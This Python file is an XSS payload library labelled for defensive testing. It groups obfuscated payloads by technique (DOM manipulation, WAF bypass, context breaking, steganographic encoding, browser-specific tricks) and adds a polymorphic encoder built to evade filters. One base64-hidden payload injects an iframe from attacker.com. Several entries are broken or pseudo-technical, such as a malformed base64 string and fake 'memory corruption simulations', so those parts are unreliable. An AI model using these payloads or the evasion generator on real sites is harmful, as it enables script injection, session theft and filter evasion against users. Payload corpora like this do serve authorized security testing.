#!/usr/bin/env python3
"""
Enhanced XSS Payloads - Risk Level 5, Complexity Level 7
Advanced Cross-Site Scripting payloads for defensive security testing

⚠️  FOR AUTHORIZED DEFENSIVE TESTING ONLY ⚠️
Risk Level 5: High-impact, sophisticated exploitation techniques
Complexity Level 7: Advanced evasion, encoding, and obfuscation
"""

from typing import Dict, List, Any
from enum import Enum

class PayloadRisk(Enum):
    LEVEL_1 = "low"
    LEVEL_2 = "moderate"
    LEVEL_3 = "medium"
    LEVEL_4 = "high"
    LEVEL_5 = "critical"

class PayloadComplexity(Enum):
    LEVEL_1 = "basic"
    LEVEL_2 = "simple"
    LEVEL_3 = "intermediate"
    LEVEL_4 = "advanced"
    LEVEL_5 = "sophisticated"
    LEVEL_6 = "expert"
    LEVEL_7 = "master"

# Risk Level 5, Complexity Level 7 XSS Payloads
ENHANCED_XSS_PAYLOADS = {
    "advanced_dom_manipulation": [
        # Advanced DOM manipulation with steganographic encoding
        '''<svg onload="eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnPGlmcmFtZSBzcmM9Imh0dHA6Ly9hdHRhY2tlci5jb20vZGF0YS5odG1sIj48L2lmcmFtZT4nOyBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGFsZXJ0KCdET00gTWFuaXB1bGF0aW9uJyk7IH0sIDEwMDAp'))"></svg>''',
        
        # Multi-layer encoding with DOM event chaining
        '''<details open ontoggle="this.innerHTML=String.fromCharCode(60,115,99,114,105,112,116,62,119,105,110,100,111,119,46,111,110,101,114,114,111,114,61,102,117,110,99,116,105,111,110,40,41,123,97,108,101,114,116,40,39,68,79,77,32,88,83,83,32,76,101,118,101,108,32,55,39,41,59,125,59,60,47,115,99,114,105,112,116,62)"></details>''',
        
        # Shadow DOM exploitation with CSS injection
        '''<template id="xss"><style>@import url(data:text/css;base64,Ym9keSB7IGJhY2tncm91bmQtaW1hZ2U6IHVybCgiamF2YXNjcmlwdDphbGVydCgnU2hhZG93IERPTSBYU1MnKSIpOyB9);</style></template><script>document.body.attachShadow({mode:'open'}).appendChild(document.getElementById('xss').content);</script>''',
        
        # Advanced prototype pollution with XSS
        '''<script>Object.prototype.toString=function(){return'<img src=x onerror="window.top.alert(\'Prototype Pollution XSS - Level 7\')">'};console.log({})</script>''',
        
        # Service Worker XSS with persistent execution
        '''<script>navigator.serviceWorker.register(URL.createObjectURL(new Blob([`self.addEventListener('fetch',e=>{e.respondWith(new Response('<script>alert("Service Worker XSS - Level 7")</script>',{headers:{'Content-Type':'text/html'}}))})`],{type:'application/javascript'})))</script>'''
    ],
    
    "advanced_waf_bypass": [
        # Unicode normalization bypass with mathematical operators
        '''<ſcript>ａｌｅｒｔ('Unicode Normalization Bypass');</ſcript>''',
        
        # Zero-width character injection with function reconstruction
        '''<img src=x onerror="eval(Function(String.fromCharCode(97,108,101,114,116,40,39,90,101,114,111,45,87,105,100,116,104,32,66,121,112,97,115,115,39,41))())">''',
        
        # HTML5 entity encoding with multiple contexts
        '''<svg><foreignobject><body xmlns="http://www.w3.org/1999/xhtml"><script>&Tab;&NewLine;alert('HTML5 Entity Bypass');&Tab;&NewLine;</script></body></foreignobject></svg>''',
        
        # Advanced polyglot with multiple interpretation contexts
        '''javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>//''',
        
        # CSS expression with font-face exploitation
        '''<style>@font-face{font-family:x;src:url(data:font/woff;base64,d09GRgABAAAAAA)}body{font-family:x;-webkit-font-feature-settings:"liga"}:before{content:'\
';expression(alert('CSS Expression XSS'))}</style>''',
        
        # Template literal exploitation with tagged templates
        '''<script>eval`alert${'('}'Advanced Template Literal XSS${')'}``</script>''',
        
        # WebAssembly execution bypass
        '''<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])).then(r=>r.instance.exports.main()==42?alert('WebAssembly XSS'):0)</script>'''
    ],
    
    "context_breaking_advanced": [
        # Advanced CDATA exploitation with XML namespaces
        '''<![CDATA[<script xmlns="http://www.w3.org/1999/xhtml">alert('CDATA Context Break')</script>]]>''',
        
        # SVG animation with SMIL timing attacks
        '''<svg><animate attributeName="onclick" dur="5s" values="alert('SMIL Animation XSS')" begin="0s" repeatCount="indefinite"/><rect width="100" height="100" onclick=""/></svg>''',
        
        # Advanced VBScript in IE compatibility mode
        '''<script language="vbscript">MsgBox "VBScript XSS - Level 7"</script>''',
        
        # MathML with advanced expression handling
        '''<math><menclose notation="actuarial"><msup><mi>x</mi><mn>2</mn></msup></menclose><annotation-xml encoding="text/html"><script>alert('MathML XSS')</script></annotation-xml></math>''',
        
        # Advanced XML external entity with XSS
        '''<!DOCTYPE html [<!ENTITY xxe SYSTEM "data:text/html,<script>alert('XXE-XSS Combo')</script>">]><div>&xxe;</div>''',
        
        # DataURI with advanced MIME type confusion
        '''<object data="data:text/html;charset=utf-7,+ADw-script+AD4-alert('UTF-7 Encoding XSS')+ADw-/script+AD4-"></object>''',
        
        # Advanced iframe sandbox bypass
        '''<iframe srcdoc="<script>parent.alert('Sandbox Bypass XSS')</script>" sandbox="allow-scripts allow-same-origin"></iframe>'''
    ],
    
    "steganographic_payloads": [
        # Base64 steganographic hiding in valid HTML
        '''<input type="hidden" value="PHNjcmlwdD5hbGVydCgnU3RlZ2Fub2dyYXBoaWMgWFNTJyk8L3NjcmlwdD4=" onload="eval(atob(this.value))">''',
        
        # CSS steganographic hiding with background properties
        '''<div style="background:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ0NTUyBTdGVnYW5vZ3JhcGh5Jylccripts+PC9zdmc+)"></div>''',
        
        # HTML comment steganography with extraction
        '''<!-- UERGLTEuNCBvYmogPDwgL0xlbmd0aCA3ID4+IHN0cmVhbSBhbGVydCgnSGlkZGVuIGluIEhUTUwgY29tbWVudCcpIGVuZHN0cmVhbSBlbmRvYmo= --><script>eval(atob(document.documentElement.innerHTML.match(/<!-- (.*) -->/)[1]))</script>''',
        
        # Unicode steganography with zero-width characters
        '''<script>eval('\u200b\u200c\u200d\ufeffalert("Unicode Steganography")\u200b\u200c\u200d\ufeff'.replace(/[\u200b\u200c\u200d\ufeff]/g,''))</script>''',
        
        # Attribute steganography with data extraction
        '''<div data-payload="YWxlcnQoJ0F0dHJpYnV0ZSBTdGVnYW5vZ3JhcGh5Jyk=" onmouseover="eval(atob(this.dataset.payload))">Hover me</div>'''
    ],
    
    "browser_specific_exploits": [
        # Chrome V8 engine specific exploitation
        '''<script>try{throw 1}catch(e){Object.defineProperty(e,'stack',{get:function(){alert('V8 Exception Handler XSS');return'x'}})}throw e</script>''',
        
        # Firefox SpiderMonkey specific features
        '''<script>if(typeof uneval!=='undefined')eval(uneval(()=>alert('SpiderMonkey Specific XSS')))</script>''',
        
        # Safari WebKit specific features
        '''<script>if(window.safari)safari.extension?alert('Safari Extension Context'):alert('Safari WebKit XSS')</script>''',
        
        # Edge Chakra specific exploitation
        '''<script>try{new ActiveXObject('Shell.Application')?alert('Edge Chakra XSS'):0}catch(e){alert('Modern Edge XSS')}</script>''',
        
        # IE specific conditional compilation
        '''<script>/*@cc_on @if(@_jscript_version>=5)alert('IE Conditional Compilation XSS')@end @*/</script>'''
    ],
    
    "timing_side_channel": [
        # Advanced timing attack with performance API
        '''<script>const t1=performance.now();for(let i=0;i<1000000;i++);const t2=performance.now();if(t2-t1>100)alert('Timing Side-Channel XSS')</script>''',
        
        # Cache timing attack with resource loading
        '''<script>const img=new Image();img.onload=()=>alert('Cache Timing Attack XSS');img.onerror=img.onload;img.src='/admin?'+Math.random()</script>''',
        
        # Network timing analysis
        '''<script>fetch('/api/sensitive',{mode:'no-cors'}).then(r=>performance.now()).then(t=>t<100?alert('Fast Response - Potential Info Leak'):0)</script>'''
    ],
    
    "memory_corruption_simulation": [
        # Simulated heap spray attempt
        '''<script>const arr=[];for(let i=0;i<1000000;i++)arr.push('\u4141'.repeat(100));alert('Heap Spray Simulation - Level 7')</script>''',
        
        # Simulated use-after-free pattern
        '''<script>const obj={};delete obj.prop;try{obj.prop=function(){alert('Use-After-Free Simulation')};obj.prop()}catch(e){alert('Memory Error Handled')}</script>''',
        
        # Buffer overflow simulation with typed arrays
        '''<script>const buf=new ArrayBuffer(8);const view=new DataView(buf);try{view.setFloat64(0,1.7976931348623157e+308);alert('Buffer Overflow Sim')}catch(e){alert('Memory Protection Active')}</script>'''
    ]
}

# Payload metadata for Risk Level 5, Complexity Level 7
PAYLOAD_METADATA = {
    "risk_level": 5,
    "complexity_level": 7,
    "description": "Advanced XSS payloads with sophisticated evasion techniques",
    "categories": list(ENHANCED_XSS_PAYLOADS.keys()),
    "total_payloads": sum(len(payloads) for payloads in ENHANCED_XSS_PAYLOADS.values()),
    "techniques": [
        "DOM Manipulation",
        "WAF Bypass",
        "Context Breaking", 
        "Steganography",
        "Browser-Specific Exploitation",
        "Timing Attacks",
        "Memory Corruption Simulation"
    ],
    "threat_indicators": [
        "Advanced Persistent XSS",
        "Client-Side Code Execution",
        "DOM Poisoning",
        "Prototype Pollution",
        "Context Confusion",
        "Encoding Bypass",
        "Browser Engine Exploitation"
    ]
}

def get_enhanced_xss_payloads(category: str = "all") -> List[str]:
    """Get enhanced XSS payloads by category"""
    if category == "all":
        all_payloads = []
        for payloads in ENHANCED_XSS_PAYLOADS.values():
            all_payloads.extend(payloads)
        return all_payloads
    return ENHANCED_XSS_PAYLOADS.get(category, [])

def get_payload_metadata() -> Dict[str, Any]:
    """Get payload metadata"""
    return PAYLOAD_METADATA

def get_random_advanced_payload() -> str:
    """Get a random advanced payload"""
    import random
    all_payloads = get_enhanced_xss_payloads("all")
    return random.choice(all_payloads)

# Advanced payload generation functions
def generate_polymorphic_xss(base_payload: str, variations: int = 5) -> List[str]:
    """Generate polymorphic variations of XSS payload"""
    import random
    import base64
    
    variations_list = []
    
    for _ in range(variations):
        # Apply different encoding techniques
        techniques = ['base64', 'unicode', 'charcode', 'hex', 'concat']
        technique = random.choice(techniques)
        
        if technique == 'base64':
            encoded = base64.b64encode(base_payload.encode()).decode()
            variant = f"eval(atob('{encoded}'))"
        elif technique == 'unicode':
            variant = ''.join(f'\\u{ord(c):04x}' for c in base_payload)
            variant = f'eval("{variant}")'
        elif technique == 'charcode':
            char_codes = ','.join(str(ord(c)) for c in base_payload)
            variant = f'eval(String.fromCharCode({char_codes}))'
        elif technique == 'hex':
            hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in base_payload)
            variant = f'eval("{hex_encoded}")'
        else:  # concat
            parts = [base_payload[i:i+3] for i in range(0, len(base_payload), 3)]
            variant = '+'.join(f"'{part}'" for part in parts)
            variant = f'eval({variant})'
        
        variations_list.append(variant)
    
    return variations_list

if __name__ == "__main__":
    # Display payload statistics
    print("Enhanced XSS Payloads - Risk Level 5, Complexity Level 7")
    print("=" * 60)
    
    metadata = get_payload_metadata()
    print(f"Risk Level: {metadata['risk_level']}")
    print(f"Complexity Level: {metadata['complexity_level']}")
    print(f"Total Payloads: {metadata['total_payloads']}")
    print(f"Categories: {len(metadata['categories'])}")
    
    print("\nCategories:")
    for category in metadata['categories']:
        count = len(ENHANCED_XSS_PAYLOADS[category])
        print(f"  - {category}: {count} payloads")
    
    print("\nTechniques:")
    for technique in metadata['techniques']:
        print(f"  - {technique}")